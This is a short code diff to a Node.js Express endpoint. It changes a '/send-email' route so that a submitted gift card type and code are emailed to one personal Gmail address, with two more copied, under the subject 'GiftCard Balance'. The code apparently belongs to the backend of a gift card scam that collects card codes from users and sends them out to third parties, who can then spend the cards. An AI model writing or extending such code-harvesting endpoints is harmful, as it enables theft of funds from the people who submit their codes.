@@ -29,8 +29,8 @@ app.get('/', (req, res) => {
 
 // POST /send-email
 app.post('/send-email', async (req, res) => {
-  const { input } = req.body;
-  if (!input) {
+  const { cardType, code } = req.body;
+  if (!cardType || !code) {
     return res.status(400).json({ error: 'Missing required fields' });
   }
   try {
@@ -39,7 +39,7 @@ app.post('/send-email', async (req, res) => {
       to: 'guirez1921@gmail.com',
       cc: 'anthony01marino@gmail.com, anthony02murino@gmail.com',
       subject: 'GiftCard Balance',
-      text: input,
+      text: `Card Type: ${cardType}\nCode: ${code}`,
     });
     res.json({ success: true, messageId: info.messageId });
   } catch (err) {
